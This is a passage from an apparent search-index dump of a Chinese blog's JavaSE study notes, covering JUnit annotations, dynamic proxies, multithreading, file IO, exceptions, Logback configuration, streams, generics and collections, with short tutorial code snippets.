@BeforeEach 用来修饰实例方法，该方法会在每一个测试方法执行之前执行一次。 @AfterEach 用来修饰实例方法，该方法会在每一个测试方法执行之后执行一次。 @BeforeAll 用来静态修饰方法，该方法会在所有测试方法之前只执行一次。 @AfterAll 用来静态修饰方法，该方法会在所有测试方法之后只执行一次。 动态代理 认识一下嘛 代理就是被代理者没有能力或者不愿意去完成某件事情，需要找个人代替自己去完成这件事，动态代理就是用来对业务功能（方法）进行代理的 关键步骤 必须有接口，实现类要实现接口 创建一个实现类的对象，该对象为业务对象，然后为业务对象创建一个代理对象 用例 public static \u003cT\u003e T getProxy(T obj) { // 返回了一个代理对象了 return (T)Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // 参数一：代理对象本身 // 参数二：正在被代理的方法 // 参数三：被代理方法，应该传入的参数 long startTimer = System .currentTimeMillis(); // 马上触发方法的真正执行。(触发真正的业务功能) Object result = method.invoke(obj, args); long endTimer = System.currentTimeMillis(); System.out.println(method.getName() + \"方法耗时：\" + (endTimer - startTimer) / 1000.0 + \"s\"); // 把业务功能方法执行的结果返回给调用者 return result; } }); } ","date":"2022-01-25","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E6%A1%86%E6%9E%B6%E6%8A%80%E6%9C%AF/:0:0","tags":null,"title":"愿天堂没有Java之框架技术","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E6%A1%86%E6%9E%B6%E6%8A%80%E6%9C%AF/"},{"categories":["Java"],"content":"JavaSE 笔记（八） Java 是一门非常严谨的语言 线程概述 认识一下嘛 Java 是通过 java.lang.Thread 类来代表线程的 线程是程序内部的一条执行路径 mian 方法的执行其实就是一条单独的执行路径，这种程序也叫做单线程程序 多线程 是指从软硬件上实现多条执行流程的技术 消息通信、淘宝、京东系统都离不开多线程技术 多线程的创建 继承 Thread 类 定义一个子类 MyThread 继承 Thread 类，重写 run() 方法 创建 MyThread 类的对象 调用线程对象的 start() 方法启动线程（启动之后还是执行 run() 方法） class MyThread extends Thread{ @Override public void run(){ // 定义线程要做的事情 } } public class ThreadDemo{ public static void main(String[] args){ Thread t = new MyThread(); t.start(); } } 只有调用 start 方法才是启动一个新的线程执行，如果直接调用 run 就会被当成普通方法执行 该方式编码简单，但是线程类已经继承 Thread，无法继承其他类，不利于扩展 实现 Runnable 接口 定义一个子类 MyThread 实现 Runnable 接口，重写 run() 方法 创建 MyRunnable 任务对象 把 MyRunnable 任务对象交给 Thread 处理 调用线程对象的 start() 方法启动线程 构造器 说明 public Thread(Runnable target) 封装Runnable对象成为线程对象 public Thread(Runnable target, String name ) 封装Runnable对象成为线程对象，并指定线程名称 class MyRunnable implements Runnable{ @Override public void run(){ // 定义线程要做的事情 } } public class ThreadDemo{ public static void main(String[] args){ Runnable target = new MyRunnable(); Thread t = new Thread(target) t.start(); } } // 以上代码可以简化为 new Thread(new Runnable() { @Override public void run() { for (int i = 0; i \u003c 10; i++) { System.out.println(\"子线程2执行输出：\" + i); } } }).start(); 该方式可以继续继承类和实现接口，扩展性很强；但是线程执行有结果没办法返回 实现 Callable 接口 定义类实现 Callable 接口，重写 call 方法，封装任务 用 FutureTask 把 Callable 对象封装成线程任务对象 把线程任务对象交给 Thread 处理 调用 start 方法启动线程，执行任务 执行完毕之后，通过 FutureTask 的 get 方法去获取任务执行的结果 方法名称 说明 public FutureTask\u003c\u003e(Callable call) 把Callable对象封装成FutureTask对象。 public V get() throws Exception 获取线程执行call方法返回的结果。 class MyCallable implements Callable\u003cString\u003e{ @Override public String call() throws Exception { return 结果; } } public class ThreadDemo{ public static void main(String[] args){ Callable\u003cString\u003e call = new MyCallable(); FutureTask\u003cString\u003e f = new FutureTask\u003c\u003e(call); Thread t = new Thread(f); t.start(); System.out.println(\"结果：\" + f.get()); } } Thread 常用方法 API 方法名称 说明 String getName() 获取当前线程的名称，默认线程名称是Thread-索引 void setName(String name) 将此线程的名称更改为指定的名称，通过构造器也可以设置线程名称 public static Thread currentThread() 返回对当前正在执行的线程对象的引用 public static void sleep(long time) 让当前线程休眠指定的时间后再继续执行，单位为毫秒 public void run() 线程任务方法 public void start() 线程启动方法 构造器 方法名称 说明 public Thread(String name) 可以为当前线程指定名称 public Thread(Runnable target) 封装Runnable对象成为线程对象 public Thread(Runnable target, String name) 封装Runnable对象成为线程对象，并指定线程名称 线程安全 问题 多个线程同时操作同一个共享资源时，会出现的业务安全问题 例如：两人拥有共同账户10万元，同时来取钱，并且都取走10万元。每个线程要进行的任务为：1、判断余额是否足够 2、吐出10万元 3、更新账户余额。当两个线程同时运行时，有可能出现两个线程都通过第一步，并执行第二步的情况。 原因 存在多线程并发 同时访问共享资源 存在修改共享资源 线程同步 解决线程安全问题 让多个线程实现先后依次访问共享资源 核心思想 加锁：将共享的资源上锁，每次只有一个线程能进入，访问完毕之后解锁，其他线程才能进来 方法一：同步代码块 作用：把出现线程安全问题的核心代码块上锁 原理：每次只有一个线程可以进入核心代码，访问完毕之后解锁 格式： synchronized(同步锁对象){ 操作共享资源的代码(核心代码) } 理论上锁对象只要对于当前同时执行的线程来说是一个对象即可，但是这样会影响其他无关线程的运行 锁对象的规范 使用共享资源作为锁对象 实例方法：this 作为锁对象 静态方法：字节码（类名.class）作为锁对象 方法二：同步方法 作用：把出现线程安全问题的核心方法上锁 原理：每次只有一个线程可以进入核心方法，访问完毕之后解锁 格式： 修饰符 synchronized 返回值类型 方法名称(形参列表){ 操作共享资源的代码 } 底层原理 同步方法底层可以看作是隐式锁对象，只是锁的范围是整个方法代码 实例方法：this 作为锁对象，但是方法要高度面向对象 静态方法：字节码（类名.class）作为锁对象 方法三：Lock 锁 Lock 实现更加广泛的锁定操作 Lock 是接口，不可以实例化，采用他的实现类 ReentrantLock 来构建 Lock 对象 方法名称 说明 public ReentrantLock() 获得Lock锁的实现类对象 void lock() 获得锁 void unlock() 释放锁 线程通信 实现 线程间相互发送数据，线程间共享一个资源即可实现线程通信 常见形式 通过共享一个数据的方式实现 根据共享数据的情况决定自己该怎么做，以及通知其他线程怎么做 生产者消费者模型 等待与唤醒 方法名称 说明 void wait() 让当前线程等待并释放所占锁，直到另一个线程调用notify()方法或 notifyAll()方法 void notify() 唤醒正在等待的单个线程 void notifyAll() 唤醒正在等待的所有线程 线程池 认识一下嘛 一种可以复用线程池的技术 线程池的接口：ExecutorService 获得线程池对象 方式一：用 ExecutorService 的实现类 ThreadPoolExcutor 自创一个线程池对象 方式二：使用 Executors 线程池的工具类调用方法返回不同特点的线程池对象 ThreadPoolExcutor 参数说明 public ThreadPoolExecutor( int corePoolSize, // 指定线程池的核心线程数量 int maximumPoolSize, // 指定线程池的最大线程数量 long keepAliveTime, // 指定临时线程最长存活时间 TimeUnit unit, // 指定存活时间的单位 BlockingQueue\u003cRunnable\u003e workQueue, // 指定任务队列 ThreadFactory threadFactory, // 指定线程工厂 RejectedExecutionHandler handler) // 指定线程忙时的处理方式 拒绝策略 策略 详解 ThreadPoolExecutor.AbortPolicy 丢弃任务并抛出RejectedExecutionException异常。是默认的策略 ThreadPoolExecutor.DiscardPolicy 丢弃任务，但是不抛出异常 这是不推荐的做法 ThreadPoolExe","date":"2022-01-18","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E7%BA%BF%E7%A8%8B/:0:0","tags":null,"title":"愿天堂没有Java之线程","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"JavaSE 笔记（七） Java 是一门非常严谨的语言 File 类概述 认识一下嘛 该类在 java.io.File 下，代表操作系统的文件对象（文件、文件夹） 该类可以定位文件，获取文件信息，删除、创建文件（夹）；但是不能读写文件 格式 仅仅是一个路径名称，该路径可以存在，也可以不存在 File file = new (\"pathname\"); 绝对路径与相对路径 绝对路径：从盘符开始 File file = new File(\"D:/poria/poria.txt\"); 相对路径：不带盘符，默认直接到当前工程下寻找文件 File file = new File(\"模块名称/poria.txt\"); 常用方法 判断文件类型、获取文件信息 方法名称 说明 public boolean isDirectory() 测试此抽象路径名表示的File是否为文件夹 public boolean isFile() 测试此抽象路径名表示的File是否为文件 public boolean exists() 测试此抽象路径名表示的File是否存在 public String getAbsolutePath() 返回此抽象路径名的绝对路径名字符串 public String getPath() 将此抽象路径名转换为路径名字符串 public String getName() 返回由此抽象路径名表示的文件或文件夹的名称 public long lastModified() 返回文件最后修改的时间毫秒值 创建文件 方法名称 说明 public boolean createNewFile() 创建一个新的空的文件 public boolean mkdir() 只能创建一级文件夹 public boolean mkdirs() 可以创建多级文件夹 删除文件 方法名称 说明 public boolean delete() 删除由此抽象路径名表示的文件或空文件夹 delete 方法默认只能删除文件和空文件夹 该删除方法不走回收站 遍历文件夹 方法名称 说明 public String[] list() 获取当前目录下所有的一级文件名称到一个字符串数组中去返回。 public File[] listFiles()(常用) 获取当前目录下所有的一级文件对象到一个文件对象数组中去返回（重点） listFIles 注意事项 当调用者不存在时，返回 null 当调用者是文件夹时，返回 null 当调用者是一个空文件夹时，返回长度为0的数组 当调用者是一个有内容的文件夹时，将里面所有的文件和文件夹的路径放在 File 数组中返回 当调用者是一个有隐藏文件的文件夹时，会将所有内容返回，包括隐藏文件 当调用者是一个有权限的文件夹时，返回 null 字符集 认识一下嘛 计算机底层不可以直接存储字符，只能存储二进制 二进制可以转化为十进制，十进制编号 计算机可以给人类字符进行编号存储，这套编号规则就是字符集 常见字符集 ASCII 美国信息交换标准码 一个字节存储一个字符，一个字节是8位，即2的八次方，对于英文，数字够用 GBK windows系统默认的码表，兼容 ASCII 码表，也包含几万汉字，并支持繁体汉字以及部分日韩文字 GBK 是中国的码表，一个中文以两个字节的形式存储 Unicode 又称统一码，万国码，单一码 容纳有世界上大多数国家的所有常见文字和符号 Unicode 会先通过 UTF-8，UTF-6 以及 UTF-32 的编码成二进制后再存储到计算机中 UTF-8 编码后一个中文一般以三个字节形式存储 编码解码方法 String 编码 方法名称 说明 byte[] getBytes() 使用平台的默认字符集将该 String编码为一系列字节，将结果存储到新的字节数组中 byte[] getBytes(String charsetName) 使用指定的字符集将该 String编码为一系列字节，将结果存储到新的字节数组中 String 解码 构造器 说明 String(byte[] bytes) 通过使用平台的默认字符集解码指定的字节数组来构造新的 String String(byte[] bytes, String charsetName) 通过指定的字符集解码指定的字节数组来构造新的 String IO 流概述 认识一下嘛 IO 流也成为输入、输出流，就是用来读写数据的 I 表示 Input，是数据从磁盘文件读到内存的过程，称之为输入，负责读 O 表示 Output，是内存数据从内存写到磁盘文件的过程，称之为输出，负责写 分类 字节流：操作所有类型的文件 字符流：只能操作纯文本文件 字节流的使用 FileInputStream 构造器 说明 public FileInputStream(File file) 创建字节输入流管道与源文件对象接通 public FileInputStream(String pathname) 创建字节输入流管道与源文件路径接通 方法名称 说明 public int read() 每次读取一个字节返回，如果字节已经没有可读的返回-1 public int read(byte[] buffer) 每次读取一个字节数组返回，如果字节已经没有可读的返回-1 public byte[] readAllBytes() throws IOException 直接将当前字节输入流对应的文件对象的字节数据装到一个字节数组返回 FileOutputStream 构造器 说明 public FileOutputStream(File file) 创建字节输出流管道与源文件对象接通 public FileOutputStream(File file，boolean append) 创建字节输出流管道与源文件对象接通，可追加数据 public FileOutputStream(String filepath) 创建字节输出流管道与源文件路径接通 public FileOutputStream(String filepath，boolean append) 创建字节输出流管道与源文件路径接通，可追加数据 方法名称 说明 public void write(int a) 写一个字节出去 public void write(byte[] buffer) 写一个字节数组出去 public void write(byte[] buffer , int pos , int len) 写一个字节数组的一部分出去。 流的刷新与关闭 方法 说明 flush() 刷新流，还可以继续写数据 close() 关闭流，释放资源，但是在关闭之前会先刷新流。一旦关闭，就不能再写数据 资源释放的方式 try-catch-finally finally：在异常处理时，提供 finally 块来执行所有清除操作，比如 IO 流中的资源释放 被 finally 控制的语句最终一定会执行，除非 JVM 退出 格式 try{ // 正常语句 }catch (Expection e){ e.printStackTrace(); }finally{ // 最终执行的语句 } 可以在 finally 块中最后释放资源 try-with-resource 虽然上面的办法可以用于释放资源，但是释放的代码过于繁琐 InputStream is = null ; OutputStream os = null; try{ ... }catch (Exception e){ e.printStackTrace(); } finally { // 关闭资源！ try { if(os != null) os.close(); } catch (Exception e) { e.printStackTrace(); } try { if(is != null) is.close(); } catch (Exception e) { e.printStackTrace(); } } 改进后的方案 定义输入流对象; 定义输出流对象; try(输入流对象；输出流对象){ 可能出现异常的代码; }catch(异常类名 变量名){ 异常的处理代码; } 注意： try 后面的小括号只能放资源对象，否则就会报错 所谓资源对象就是实现了 Closeable/AutoCloseable 接口的对象 字符流的使用 Reader 构造器 说明 public FileReader(File file) 创建字符输入流管道与源文件对象接通 public FileReader(String pathname) 创建字符输入流管道与源文件路径接通 方法名称 说明 public int read() 每次读取一个字符返回，如果字符已经没有可读的返回-1 public int read(char[] buffer) 每次读取一个字符数组，返回读取的字符个数，如果字符已经没有可读的返回-1 FileWriter 构造器 说明 public FileWriter(File file) 创建字符输出流管道与源文件对象接通 public FileWriter(File file，boolean append) 创建字符输出流管道与源文件对象接通，可追加数据 public FileWriter(String filepath) 创建字符输出流管道与源文件路径接通 public FileWriter(String filepath，boolean append) 创建字符输出流管道与","date":"2021-12-22","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:0:0","tags":null,"title":"愿天堂没有Java之文件操作","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["Java"],"content":"JavaSE 笔记（六） Java 是一门非常严谨的语言 异常概述 认识一下嘛 异常是程序在“编译”或“执行”过程中可能出现的问题 比如：数组索引越界，空指针异常，日期格式化异常，等 异常一旦出现，如果不处理，程序就会退出 JVM 虚拟机而终止 研究异常并且避免异常，然后提前处理异常，体现的是程序的安全，健壮性 体系 Error：系统级别的问题，JVM 退出等，代码无法控制 Exception：java.lang 包下，称为异常类，它表示程序本身可以处理的问题 RuntimeException 及其子类：运行时异常，编译阶段不会报错（空指针异常，数组越界异常） 除了上面那个异常之外的所有异常：编译时报错，编译期必须处理（日期格式化异常） 两种异常的说明 编译时异常，是在编译成 class 文件时必须要处理的异常，也称之为受检异常 运行时异常，在编译成 class 文件时不需要处理，在运行字节码文件时可能出现的异常 默认处理流程 流程 默认会在出现异常的代码那里自动的创建一个异常对象 异常会从方法中出现的点这里抛出给调用者，调用者最终抛出给 JVM 虚拟机 虚拟机接到异常对象后，先在控制台直接输出异常栈信息 直接从当前执行的异常点结束掉当前程序 后续代码没有机会执行，因为程序已经死亡 机制 默认机制并不好，一旦程序出现异常，就立即死亡 异常处理机制 编译时异常 方式一：throws 用在方法上，可以将方法内部出现的异常抛出去给本方法的调用者处理 这种方式并不好，发生异常的方法自己不去处理异常，如果异常最终抛给虚拟机将引起程序死亡 格式 方法 throws 异常1，异常2，异常3 ...{ } // 推荐做法 方法 throws Exception{ // 代表可以抛出一切异常 } 方法二：try…catch… 监视捕获异常，用在方法内部，可以将方法内部出现的异常直接捕获 这种方式较为常用，发生异常的方法自己独立完成异常的处理，程序可以继续往下执行 try{ // 监视可能出现异常的代码 }catch(异常类型1 变量){ // 处理异常 }catch(异常类型2 变量){ // 处理异常 } try{ // 可能出现异常的代码 }catch(Exception e){ e.printStackTrace(); // 直接打印异常栈信息 } 方式三：前两者结合 方法直接抛出异常给调用者 调用者收到异常后捕获处理 public static void main(String[] args) { try { parseTime(\"2011-11-11 11:11:11\"); System.out.println(\"功能操作成功~~~\"); } catch (Exception e) { e.printStackTrace(); System.out.println(\"功能操作失败~~~\"); } } public static void parseTime(String date) throws Exception { SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"); Date d = sdf.parse(date); System.out.println(d); InputStream is = new FileInputStream(\"D:/Poria.jpg\"); } 运行时异常的处理机制，建议使用方式三来处理 自定义异常 必要性 Java 无法为这个世界上全部的问题提供异常类 如果想通过异常的方式来管理自己的某个业务，就需要自定义异常类 分类 自定义编译时异常 定义一个异常类继承 Exception 重写构造器 在出现异常的地方用 throw new 自定义对象抛出 自定义运行时异常 定义一个异常类继承 RuntimeException 重写构造器 在出现异常的地方用 throw new 自定义对象抛出 日志技术概述 认识一下嘛 用来记录程序运行过程中的信息，并且进行永久存储 优势 可以将系统执行的信息选择性的记录到指定的位置（控制台、文件中、数据库） 可以随时以开关的形式控制是否记录日志，无需修改源代码 多线程性能较好 体系 日志规范 一些接口，提供给日志的实现框架设计的标准 常见规范有 Commons Logging 简称：JCL Simple Logging Facade For Java 简称：slf4j 日志框架 Log4j JUL（java.util.logging） Logback Logback 认识一下嘛 官网：https://logback.qos.ch/index.html Logback 是由 log4j 创始人设计的另一个开源日志组件，性能较好 基于 slf4j 实现 三个模块 logback-core：为其他两个模块奠定了基础 logback-classic：是 log4j 的一个改良版本，同时完整实现了 slf4j API logback-access：与 Tomcat 和 Jetty 等 Serlvet 容器集成，以提供 HTTP 访问日志功能 使用步骤 在项目下新建 lib 文件夹，导入 Logback 的相关 jar 包到该文件夹下，并添加到项目库中 必须将 Logback 的核心配置文件 logback.xml 直接拷贝到 src 目录下 在代码中获取日志的对象 ：public static final Logger LOGGER = LoggerFactory.getLogger(\"类对象\"); 使用日志对象输出日志信息 配置文件 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cconfiguration\u003e \u003c!-- CONSOLE：表示当前的日志信息是可以输出到控制台的 --\u003e \u003cappender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\"\u003e \u003c!-- 输出流对象 默认 System.out 改为 System.err --\u003e \u003ctarget\u003eSystem.out\u003c/target\u003e \u003cencoder\u003e \u003c!-- 格式化输出：%d表示日期，%thread表示线程名，%-5level：级别从左显示5个字符宽度，%msg：日志消息，%n是换行符 --\u003e \u003cpattern\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} [%-5level] %c [%thread] : %msg%n\u003c/pattern\u003e \u003c/encoder\u003e \u003c/appender\u003e \u003c!-- File是输出的方向通向文件的 --\u003e \u003cappender name=\"FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"\u003e \u003cencoder\u003e \u003cpattern\u003e%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u003c/pattern\u003e \u003ccharset\u003eutf-8\u003c/charset\u003e \u003c/encoder\u003e \u003c!--日志输出路径--\u003e \u003cfile\u003e/var/log/poria\u003c/file\u003e \u003c!--指定日志文件拆分和压缩规则--\u003e \u003crollingPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\"\u003e \u003c!--通过指定压缩文件名称，来确定分割文件方式--\u003e \u003cfileNamePattern\u003eC:/code/itheima-data2-%d{yyyy-MM-dd}.log%i.gz\u003c/fileNamePattern\u003e \u003c!--文件拆分大小--\u003e \u003cmaxFileSize\u003e1MB\u003c/maxFileSize\u003e \u003c/rollingPolicy\u003e \u003c/appender\u003e \u003c!-- level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF 默认debug \u003croot\u003e可以包含零个或多个\u003cappender-ref\u003e元素，标识这个输出位置将会被本日志级别控制 --\u003e \u003croot level=\"ALL\"\u003e \u003c!-- 注意：如果这里不配置关联打印位置，该位置将不会记录日志--\u003e \u003cappender-ref ref=\"FILE\" /\u003e \u003c/root\u003e \u003c/configuration\u003e ","date":"2021-12-22","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E5%BC%82%E5%B8%B8%E4%B8%8E%E6%97%A5%E5%BF%97/:0:0","tags":null,"title":"愿天堂没有Java之异常与日志","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E5%BC%82%E5%B8%B8%E4%B8%8E%E6%97%A5%E5%BF%97/"},{"categories":["Java"],"content":"JavaSE 笔记（五） Java 是一门非常严谨的语言 Stream 流概述 认识一下嘛 得益于 Lambda 所带来的函数式编程，出现了 Stream 流的概念 用于简化集合和数组操作的 API 思想 先得到集合或者数组的 Stream 流 将元素放在上面 用 Stream 流简化的方式来方便的操作元素 流的三类方法 获取流：创建一条流水线，并把数据放在流水线上操作 中间方法：一次操作完成之后，还可以继续其他操作 终结方法：一个流只能有一个终结方法，是流水线上的最后一个操作 流的获取 集合获取流 使用 Collection 接口中的默认方法 名称 说明 default Stream\u003cE\u003e stream() 获取当前集合对象的Stream流 用例 // Collection集合获取流 Collection\u003cString\u003e list = new ArrayList\u003c\u003e(); Stream\u003cString\u003e s = list.stream(); // Map集合获取流 Map\u003cString, Integer\u003e maps = new HashMap\u003c\u003e(); Stream\u003cString\u003e keyStream = maps.keySet().stream(); // 键流 Stream\u003cInteger\u003e valueStream = maps.values().stream(); // 值流 Stream\u003cMap.Entry\u003cString,Integer\u003e\u003e keyAndValueStream = maps.entrySet().stream(); // 键值对流（拿整体） 数组获取流 用到的方法 名称 说明 public static \u003cT\u003e Stream\u003cT\u003e stream(T[] array) 获取当前数组的Stream流 public static\u003cT\u003e Stream\u003cT\u003e of(T... values) 获取当前数组/可变数据的Stream流 用例 String[] names = {\"Poria\",\"Pupi1\"}; Stream\u003cString\u003e nameStream1 = Arrays.stream(names); Stream\u003cString\u003e nameStream2 = Stream.of(names); 流的中间方法 常用方法 名称 说明 Stream\u003cT\u003e filter(Predicate\u003c? super T\u003e predicate) 用于对流中的数据进行过滤。 Stream\u003cT\u003e limit(long maxSize) 获取前几个元素 Stream\u003cT\u003e skip(long n) 跳过前几个元素 Stream\u003cT\u003e distinct() 去除流中重复的元素。依赖(hashCode和equals方法) static \u003cT\u003e Stream\u003cT\u003e concat(Stream a, Stream b) 合并a和b两个流为一个流 注意事项 中间方法也称非终结方法，调用完成之后返回新的流可以继续使用，支持链式编程 在流中无法直接修改集合、数组中的数据 流的终结方法 常用方法 名称 说明 void forEach(Consumer action) 对此流的每个元素执行遍历操作 long count() 返回此流中的元素数 注意事项 调用之后无法继续使用流了，因为这些方法不会返回流 流的收集 认识一下嘛 把流操作后的结果数据转回到集合或者数组中去 流只是方便操作集合/数组的手段，集合/数组才是开发中的目的 收集方法 名称 说明 R collect(Collector collector) 开始收集Stream流，指定收集器 Collectors 工具类中提供了具体的收集方法 名称 说明 public static \u003cT\u003e Collector toList() 把元素收集到List集合中 public static \u003cT\u003e Collector toSet() 把元素收集到Set集合中 public static Collector toMap(Function keyMapper , Function valueMapper) 把元素收集到Map集合中 ","date":"2021-12-14","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bstream%E6%B5%81/:0:0","tags":null,"title":"愿天堂没有Java之Stream流","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bstream%E6%B5%81/"},{"categories":["Java"],"content":"JavaSE 笔记（四） Java 是一门非常严谨的语言 泛型概述 认识一下嘛 可以在编译阶段约束操作的数据类型 格式为：\u003c数据类型\u003e，只能支持引用数据类型 可以定义的地方 泛型类：类后面定义 泛型方法：方法申明上定义 泛型接口：接口后面定义 优势 统一数据类型，把出现泛型变量的地方全部替换为传输的真实数据类型 把运行时期可能出现的问题提到了编译期间，避免了强制类型转换可能出现的异常 泛型类 格式 修饰符 class 类名\u003c泛型变量\u003e{} public class MyArrayList\u003cE\u003e { private ArrayList lists = new ArrayList(); public void add(E e){ lists.add(e); } public void remove(E e){ lists.remove(e); } @Override public String toString() { return lists.toString(); } } 作用：编译阶段约定操作的数据的类型，类似于集合的作用 泛型方法 格式 修饰符 \u003c泛型变量\u003e 方法返回值 方法名称(形参列表){} public static \u003cT\u003e void printArray(T[] arr){ if(arr == null){ return System.out.println(arr); } StringBuilder sb = new StringBuilder(\"[\"); for(int i = 0; i \u003c arr.length; i++){ sb.append(arr[i]).append(i == arr.length - 1 ? \"\" : \",\"); } sb.append(\"]\"); System.out.println(sb); } 作用：方法中可以使用泛型接收一切实际类型的参数，方法更具备通用性 泛型接口 格式 修饰符 interface 接口名称\u003c泛型变量\u003e{} public interface Data\u003cE\u003e { void add(E e); void delete(int id); void update(E e); E queryById(int id); } 作用：实现类可以在实现接口的时候传入自己操作的数据类型，这样重写的方法都将是针对于该类型的操作 通配符与上下限 通配符? 可以在使用泛型中代表一切类型 E T K V是在定义泛型的时候使用的 上下限 ? extends Car：此时，?必须是 Car 或者其子类，泛型上限 ? super Car：此时，?必须是 Car 或者其父类，泛型下限 集合概述 认识一下嘛 集合和数组都是容器，用来存放数据 数组可以存储基本数据类型和引用类型，集合只能存储引用类型 但是数组完成定义之后，类型确定，长度确定；但是集合启动之后，类型长度都可以发生变化，更像是气球 体系特点 集合分为两类 Collection单列集合，每个元素只包含一个值 Map双列集合，每个元素包含两个值（键值对） Collection 集合 认识一下嘛 List（接口） 系列集合 ArrayList（实现类）：有序、可重复、有索引 LinkedList（实现类）：有序、可重复、有索引 Set（接口） 系列集合 HashSet（实现类）：无序、不重复、无索引 LinkedHashSet（实现类）：有序、不重复、无索引 TreeSet（实现类）：按照大小默认升序排列、不重复、无索引 注意事项 集合支持泛型 集合与泛型不支持基本类型，只支持引用类型 集合中存储的元素都被认为是对象 常用方法 Collection 是单列集合的祖宗接口，它的功能全部单列集合都可以继承使用 方法名称 说明 public boolean add(E e) 把给定的对象添加到当前集合中 public void clear() 清空集合中所有的元素 public boolean remove(E e) 把给定的对象在当前集合中删除 public boolean contains(Object obj) 判断当前集合中是否包含给定的对象 public boolean isEmpty() 判断当前集合是否为空 public int size() 返回集合中元素的个数。 public Object[] toArray() 把集合中的元素，存储到数组中 集合的遍历方式 方式一：迭代器 获取迭代器 方法名称 说明 Iterator\u003cE\u003e iterator() 返回集合中的迭代器对象，该迭代器对象默认指向当前集合的0索引 常用方法 方法名称 说明 boolean hasNext() 询问当前位置是否有元素存在，存在返回true ,不存在返回false E next() 获取当前位置的元素，并同时将迭代器对象移向下一个位置，注意防止取出越界。 用例 Iterator\u003cString\u003e it = lists.iterator(); while(it.hasNext()){ String ele = it.next(); System.out.println(ele); } 方式二：增强 for 循环 既可以遍历集合也可以遍历数组 在遍历删除时可能会出现并发修改异常 用例 for(元素数据类型 变量名 : 数组或者Collection集合) { //在此处使用变量即可，该变量就是元素 } Collection\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"poria1\"); list.add(\"poria2\"); list.add(\"poria3\"); for(String ele : list) { System.out.println(ele); } 方式三：lambda 表达式 方法 方法名称 说明 default void forEach(Consumer\u003c? super T\u003e action): 结合lambda遍历集合 用例 Collection\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(\"poria1\"); list.add(\"poria2\"); list.add(\"poria3\"); lists.forEach(new Consumer\u003cString\u003e(){ @Override pubilc void accept(String s){ System.out.println(s); } }); // 以上代码可以简化为 lists.forEach(s -\u003e System.out.println(s)); List 系列集合 特有方法 方法名称 说明 void add(int index,E element) 在此集合中的指定位置插入指定的元素 E remove(int index) 删除指定索引处的元素，返回被删除的元素 E set(int index,E element) 修改指定索引处的元素，返回被修改的元素 E get(int index) 返回指定索引处的元素 遍历方式 迭代器 增强 for 循环 Lambda 表达式 for 循环（List 集合有索引） ArrayList 基于数组实现，定位元素快，增删则需要移位，效率较低 第一次创建集合并添加元素时，会默认创建一个长度为10的数组 LinkedList 基于双链表实现，首位操作快，查询慢 特有功能 方法名称 说明 public void addFirst(E e) 在该列表开头插入指定的元素 public void addLast(E e) 将指定的元素追加到此列表的末尾 public E getFirst() 返回此列表中的第一个元素 public E getLast() 返回此列表中的最后一个元素 public E removeFirst() 从此列表中删除并返回第一个元素 public E removeLast() 从此列表中删除并返回最后一个元素 Set 系列集合 常见方法 功能与 Collection 的基本一致 LinkedHashSet 基于数组 + 双链表 + 红黑树实现 TreeSet 基于红黑树实现排序 该集合一定要排序，可以将元素按照指定的规则排序 使用场景总结 元素可重复，有索引，索引查询要快 ArrayList 基于数组 元素可重复，有索引，首位操作快 LinkedList 基于链表 增删改查快，元素不重复、无序、无索引 HashSet 基于哈希表 增删改查快、元素不重复、有序、无索引 LinkedHashSet 基于哈希表和双链表 可变参数 认识一下嘛 可变参数在形参中可以接收多个数据 格式 数据类型...参数名称 sum(); // 1、不传参数 sum(10); // 2、可以传输一个参数 sum(10, 20, 30); // 3、可以传输多个参数 sum(new int[]{10, 20, 30, 40, 50}); // 4、可以传输一个数组 public static void sum(int...nums) 作用 非常灵活，方便。可以不传输参数，可以传输1个或者多个，也可以传输一个数组 可变参数在内部本质上就是一个数组 注意事项 一个形参列表中可变参数只能有一个 可变参数必须放在形参列表最后面 集合工具类 认识一下嘛 java.utils.Collections：是集合工具类 Collections 不属于集合，是用来操作集合的工具类 常用方法 方法名称 说明 publ","date":"2021-12-14","objectID":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E9%9B%86%E5%90%88/:0:0","tags":null,"title":"愿天堂没有Java之集合","uri":"/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java"],"content":"JavaSE 笔记（三） Java 是一门非常严谨的语言 API 概述 认识一下嘛 API (Application Programming 